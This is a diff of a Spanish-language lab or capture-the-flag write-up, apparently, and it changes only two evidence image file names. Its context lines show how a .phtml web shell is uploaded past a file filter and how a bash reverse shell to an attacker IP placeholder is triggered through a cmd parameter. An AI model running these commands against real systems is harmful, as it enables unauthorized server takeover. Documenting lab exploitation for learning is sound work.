@@ -81,7 +81,7 @@ Se creó el archivo con extensión alternativa `.phtml`, aún interpretada como 
 curl -X POST http://<IP_OBJETIVO>/panel/ -F "fileUpload=@shell.phtml" -F "submit=Upload"
 ```
 
-![Intento con error de sintaxis en curl](./evidencias/04_1-bypass-phtml.png)
+![Intento con error de sintaxis en curl](./evidencias/04.1-bypass-phtml.png)
 
 Al corregir el comando, la subida fue exitosa: `"O arquivo foi upado com sucesso!"`, devolviendo la ruta `/uploads/shell.phtml`.
 
@@ -114,7 +114,7 @@ curl -G "http://<IP_OBJETIVO>/uploads/shell.phtml" \
   --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'"
 ```
 
-![Comando de disparo de la reverse shell](./evidencias/06_1-revershhell.png)
+![Comando de disparo de la reverse shell](./evidencias/06.1-revershhell.png)
 
 Se recibió conexión entrante como `www-data`.
 
